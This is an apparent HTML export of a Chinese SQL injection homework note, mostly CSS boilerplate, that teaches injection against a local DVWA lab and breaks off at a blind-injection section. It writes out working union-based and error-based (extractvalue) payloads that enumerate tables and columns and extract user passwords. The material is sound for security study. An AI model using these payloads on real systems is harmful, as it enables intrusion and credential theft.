@@ -1,0 +1,777 @@
+<!DOCTYPE html><html><head>
+      <title>16.sql&#x6CE8;&#x5165;&#x4F5C;&#x4E1A;</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:////Users/qiffang/.atom/packages/markdown-preview-enhanced/node_modules/@shd101wyy/mume/dependencies/katex/katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <style>
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
+ */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
+
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
+}
+
+.token.comment,
+.token.blockquote {
+  color: #969896;
+}
+
+.token.cdata {
+  color: #183691;
+}
+
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
+}
+
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
+}
+
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
+}
+
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
+
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: hsla(24, 20%, 50%,.08);
+  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+
+pre[data-line] .line-highlight:before, 
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: hsla(24, 20%, 50%,.4);
+  color: hsl(24, 20%, 95%);
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <h1 class="mume-header" id="sql-%E6%B3%A8%E5%85%A5">SQL &#x6CE8;&#x5165;</h1>
+
+<h2 class="mume-header" id="%E4%BB%80%E4%B9%88%E6%98%AF-sql-%E6%B3%A8%E5%85%A5">&#x4EC0;&#x4E48;&#x662F; SQL &#x6CE8;&#x5165;</h2>
+
+<p>&#x4F8B;&#x5982;&#xFF1A;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684; user ID &#x67E5;&#x8BE2;&#x7528;&#x6237;&#x4FE1;&#x606F;</p>
+<input placeholder="user ID">
+<input type="submit" value="Search">
+<br>
+<br>
+<p>&#x7528;&#x6237;&#x8F93;&#x5165; <code>1</code>&#xFF0C;&#x5BF9;&#x5E94; SQL &#x8BED;&#x53E5;&#x4E3A;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>SELECT first_name,last_name FROM users WHERE id = 1;
+</code></pre><p><strong>&#x53D1;&#x751F;&#x6CE8;&#x5165;</strong></p>
+<p>&#x6076;&#x610F;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x8F93;&#x5165; <code>1 or 1=1</code>&#xFF0C;&#x83B7;&#x53D6;&#x5168;&#x8868;&#xFF0C;&#x6267;&#x884C; SQL &#x8BED;&#x53E5;&#x4E3A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>SELECT first_name,last_name FROM users WHERE id = 1 or 1=1;
+</code></pre><p><strong>&#x6210;&#x56E0;</strong></p>
+<p>&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x88AB;&#x4F5C;&#x4E3A; SQL &#x6307;&#x4EE4;&#x8FDB;&#x884C;&#x4E86;&#x6267;&#x884C;</p>
+<h2 class="mume-header" id="sql-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3">SQL &#x6CE8;&#x5165;&#x7684;&#x5371;&#x5BB3;</h2>
+
+<p>SQL &#x6CE8;&#x5165;&#x5C5E;&#x4E8E;&#x9AD8;&#x5371;&#x6F0F;&#x6D1E;</p>
+<p>&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF0C;&#x4FEE;&#x6539;&#x4FE1;&#x606F;&#xFF0C;&#x8131;&#x88E4;&#xFF0C;&#x4E0A;&#x4F20; webshell&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;</p>
+<h2 class="mume-header" id="%E6%90%AD%E5%BB%BA%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83">&#x642D;&#x5EFA;&#x9776;&#x673A;&#x73AF;&#x5883;</h2>
+
+<p><strong>DVWA</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>$ docker pull sagikazarmark/dvwa
+$ docker run -d --name dvwa -p 8080:80 -p 33060:3306 sagikazarmark/dvwa
+</code></pre><p>&#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;&#xFF0C;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801; admin/password</p>
+<p>&#x4F7F;&#x7528;&#x524D;&#x5148;&#x8BBE;&#x7F6E; Security Level &#x4E3A; Low</p>
+<h2 class="mume-header" id="%E5%88%A4%E6%96%AD%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B">&#x5224;&#x65AD;&#x53C2;&#x6570;&#x7C7B;&#x578B;</h2>
+
+<p><strong>&#x6570;&#x503C;&#x578B;</strong></p>
+<ol>
+<li>&#x8F93;&#x5165;&#x6846;&#x4E2D;&#x8F93;&#x5165; <code>1&apos;</code>&#xFF0C;&#x62A5; sql &#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#xFF0C;&#x8BC1;&#x660E;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x88AB;&#x89E3;&#x6790;&#x4E86;&#xFF0C;&#x5BF9;&#x5E94; sql &#x4EE3;&#x7801;&#xFF08;&#x5355;&#x5F15;&#x53F7;&#x672A;&#x95ED;&#x5408;&#xFF09;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>SELECT first_name,last_name FROM users WHERE id = 1&apos;;
+</code></pre><ol start="2">
+<li>&#x8F93;&#x5165;&#x6846;&#x4E2D;&#x8F93;&#x5165; <code>1 and 1=1</code>&#xFF0C;&#x6B63;&#x5E38;&#x8F93;&#x51FA;&#xFF0C;&#x4E0E;&#x539F;&#x59CB;&#x9875;&#x9762;&#x65E0;&#x5DEE;&#x5F02;</li>
+<li>&#x8F93;&#x5165;&#x6846;&#x4E2D;&#x8F93;&#x5165; <code>1 and 1=2</code>&#xFF0C;&#x6B63;&#x5E38;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x65E0;&#x7ED3;&#x679C;</li>
+</ol>
+<p>&#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x4E09;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x5224;&#x65AD;&#x4E3A;&#x6570;&#x503C;&#x578B; sql &#x6CE8;&#x5165;</p>
+<p><strong>&#x5B57;&#x7B26;&#x578B;</strong></p>
+<p>&#x5B57;&#x7B26;&#x578B;&#x9700;&#x8981;&#x7528;&#x5355;&#x5F15;&#x53F7;&#x6765;&#x95ED;&#x5408;&#xFF0C;&#x6B63;&#x5E38; sql &#x8BED;&#x53E5;&#x5982;&#x4E0B;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>SELECT first_name,last_name FROM users WHERE id = &apos;1&apos;;
+</code></pre><p>&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x8F93;&#x5165; <code>1&apos; or 1=1#</code>&#xFF0C;&#x6D4B;&#x8BD5;&#x6CE8;&#x5165;&#xFF0C;&#x5BF9;&#x5E94;&#x7684; sql &#x8BED;&#x53E5;&#x4E3A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>SELECT first_name,last_name FROM users WHERE id = &apos;1&apos; or 1=1#&apos;
+</code></pre><p>&#x4E95;&#x53F7; <code>#</code> &#x4E3A;&#x6CE8;&#x91CA;&#xFF0C;DVWA &#x4E2D;&#x5C31;&#x662F;&#x5B57;&#x7B26;&#x578B;&#x6CE8;&#x5165;</p>
+<h2 class="mume-header" id="union-%E6%B3%A8%E5%85%A5">Union &#x6CE8;&#x5165;</h2>
+
+<p><strong>UNION</strong></p>
+<p>UNIOIN &#x7528;&#x4E8E;&#x5408;&#x5E76;&#x591A;&#x4E2A;&#x76F8;&#x4F3C;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x67E5;&#x8BE2;&#x7684;&#x5217;&#x6570;&#x9700;&#x8981;&#x76F8;&#x540C;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>mysql&gt; SELECT user_id,first_name FROM users WHERE user_id = 1 UNION ALL SELECT user_id,first_name FROM users WHERE user_id = 2;
++---------+------------+
+| user_id | first_name |
++---------+------------+
+|       1 | admin      |
+|       2 | Gordon     |
++---------+------------+
+</code></pre><p>&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x4F7F;&#x7528; <code>UNION ALL</code> &#x907F;&#x514D;&#x53BB;&#x91CD;</p>
+<p><strong>&#x8054;&#x5408;&#x6CE8;&#x5165;&#x8FC7;&#x7A0B;</strong></p>
+<ol>
+<li>&#x5224;&#x65AD;&#x6CE8;&#x5165;&#x70B9;</li>
+<li>&#x5224;&#x65AD;&#x662F;&#x6574;&#x5F62;&#x8FD8;&#x662F;&#x5B57;&#x7B26;&#x578B;</li>
+<li>&#x5224;&#x65AD;&#x5217;&#x6570;&#x3001;&#x5224;&#x65AD;&#x663E;&#x793A;&#x4F4D;</li>
+<li>&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x540D;</li>
+<li>&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x6240;&#x6709;&#x8868;&#x540D;&#x3001;&#x5B57;&#x6BB5;&#x540D;&#x3001;&#x5B57;&#x6BB5;&#x4E2D;&#x7684;&#x6570;&#x636E;</li>
+</ol>
+<p><strong>&#x5224;&#x65AD;&#x5217;&#x6570;</strong></p>
+<p>&#x4F7F;&#x7528; <code>order by</code></p>
+<p>&#x5728; DVWA &#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x786E;&#x8BA4;&#x4E3A;&#x5B57;&#x7B26;&#x578B;&#x6CE8;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x7528; <code>1&apos; xxx #</code> &#x7684;&#x65B9;&#x5F0F;&#x6CE8;&#x5165;&#xFF0C;&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x8F93;&#x5165; <code>1&apos; order by 2#</code>&#xFF0C;&#x6B64;&#x65F6;&#x67E5;&#x8BE2;&#x6B63;&#x5E38;&#xFF0C;&#x8BF4;&#x660E;&#x5B58;&#x5728;&#x7B2C;&#x4E8C;&#x5217;</p>
+<p>&#x7EE7;&#x7EED;&#x7528; <code>1&apos; orderby 3#</code> &#x6D4B;&#x8BD5;&#xFF0C;&#x62A5;&#x9519;&#xFF0C;&#x8BF4;&#x660E;&#x7B2C;&#x4E09;&#x5217;&#x4E0D;&#x5B58;&#x5728;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>Unknown column &apos;3&apos; in &apos;order clause&apos;
+</code></pre><p>&#x6700;&#x7EC8;&#x5217;&#x6570;&#x4E3A; 2</p>
+<p><strong>&#x786E;&#x5B9A;&#x663E;&#x793A;&#x4F4D;</strong></p>
+<p>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x5224;&#x65AD;&#xFF0C;&#x4F8B;&#x5982;&#x8F93;&#x5165;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select 1,2#
+</code></pre><p>&#x9875;&#x9762;&#x67E5;&#x770B; 1&#xFF0C;2 &#x7684;&#x663E;&#x793A;&#x4F4D;&#x7F6E;</p>
+<p><strong>&#x7206;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;</strong></p>
+<p>&#x4F7F;&#x7528;&#x4E24;&#x4E2A;&#x51FD;&#x6570;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select database(), version() #
+</code></pre><p>&#x8F93;&#x51FA;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>ID: 1&apos; union all select database(), version() #
+First name: admin
+Surname: admin
+ID: 1&apos; union all select database(), version() #
+First name: dvwa
+Surname: 5.5.54-0+deb8u1-log
+</code></pre><p>&#x83B7;&#x5F97;&#x6570;&#x636E;&#x5E93;&#x8868;&#x540D; DVWA</p>
+<p><strong>&#x83B7;&#x53D6;&#x5176;&#x4ED6;&#x6570;&#x636E;</strong></p>
+<p>&#x83B7;&#x53D6;&#x8868;&#x540D;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;#
+</code></pre><p>&#x83B7;&#x53D6;&#x7528;&#x6237;&#x8868;&#x5B57;&#x6BB5;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name = &apos;users&apos; #
+</code></pre><p>&#x83B7;&#x53D6;&#x5BC6;&#x7801;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select first_name,password from users #
+</code></pre><p><strong>&#x8865;&#x5145;</strong></p>
+<p>MySQL 5.0 &#x4EE5;&#x4E0A;&#x81EA;&#x5E26;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; information_schema &#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;information_schema &#x5305;&#x542B;&#x4E09;&#x4E2A;&#x8868;&#x975E;&#x5E38;&#x91CD;&#x8981;</p>
+<ol>
+<li>schemata&#xFF1A;&#x8868;&#x91CC;&#x5305;&#x542B;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x5B57;</li>
+<li>tables&#xFF1A;&#x8868;&#x91CC;&#x5305;&#x542B;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6240;&#x6709;&#x8868;&#x4FE1;&#x606F;</li>
+<li>columns&#xFF1A;&#x5217;&#x4FE1;&#x606F;</li>
+</ol>
+<p>group_concat &#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5C06;&#x76F8;&#x540C;&#x5B57;&#x6BB5;&#x591A;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; union all select 1,group_concat(column_name) from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name = &apos;users&apos; #
+</code></pre><h2 class="mume-header" id="%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">&#x62A5;&#x9519;&#x6CE8;&#x5165;</h2>
+
+<p>&#x5229;&#x7528; mysql &#x62A5;&#x9519;&#x4FE1;&#x606F;</p>
+<p>&#x6211;&#x4EEC;&#x5229;&#x7528;&#x8FD9; 2 &#x4E2A;&#x51FD;&#x6570;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;</p>
+<ul>
+<li>extractvalue()</li>
+<li>updatexml()</li>
+</ul>
+<p><strong>extractvalue</strong></p>
+<p>&#x8BED;&#x6CD5;&#xFF1A;<br>
+extractvalue(XML_document&#xFF0C;xpath_string)</p>
+<p>&#x7528;&#x6CD5;&#xFF1A;<br>
+&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x7684; xpath &#x8DEF;&#x5F84;&#x89E6;&#x53D1;&#x62A5;&#x9519;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>mysql&gt; SELECT * FROM users WHERE user_id = 1 and (extractvalue(1,concat(0x7e,database())));
+ERROR 1105 (HY000): XPATH syntax error: &apos;~dvwa&apos;
+
+# &#x4F7F;&#x7528; concat &#x6784;&#x9020;&#x5B57;&#x7B26;&#x4E32; &quot;~dvwa&quot;&#xFF0C;0x7e &#x4E3A;&#x5B57;&#x7B26; &apos;~&apos;
+</code></pre><p><em>&#x6CE8;&#x610F;&#xFF1A;xmlpath &#x957F;&#x5EA6;&#x9650;&#x5236; 32 &#x4F4D;</em></p>
+<p><strong>updatexml</strong></p>
+<p>&#x8BED;&#x6CD5;&#xFF1A;<br>
+updatexml(XML_document, XPath_string,new_value)</p>
+<p><strong>&#x6CE8;&#x5165;&#x8FC7;&#x7A0B;</strong></p>
+<ol>
+<li>&#x7206;&#x6570;&#x636E;&#x5E93;&#x540D;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and extractvalue(1, concat(0x7e,database()))#
+</code></pre><ol start="2">
+<li>&#x7206;&#x8868;&#x6570;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and extractvalue(1, concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database())))#
+</code></pre><ol start="3">
+<li>&#x7206;&#x8868;&#x540D;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#
+1&apos; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))#
+</code></pre><ol start="4">
+<li>&#x7206;&#x5B57;&#x6BB5;&#x540D;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1)))#
+1&apos; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1)))#
+1&apos; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1)))#
+...
+</code></pre><ol start="5">
+<li>&#x7206;&#x5BC6;&#x7801;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>1&apos; and extractvalue(1, concat(0x7e,(select password from users where user_id=1 )))#
+1&apos; and extractvalue(1, concat(0x7e,(select password from users where user_id=2 )))#
+...
+</code></pre><h2 class="mume-header" id="%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">&#x5E03;&#x5C14;&#x76F2;&#x6CE8;</h2>
+
+<p>&#x5728;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x67E5;&#x8BE2;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x9875;&#x9762;&#x4E0D;&#x8FD4;&#x56DE;&#x67E5;&#x8BE2;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x800C;&#x53EA;&#x8FD4;&#x56DE;&#x6709;&#x7ED3;&#x679C;&#x6216;&#x65E0;&#x7ED3;&#x679C;</p>
+<p><strong>&#x6784;&#x9020;&#x6D4B;&#x8BD5;</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">id</th>
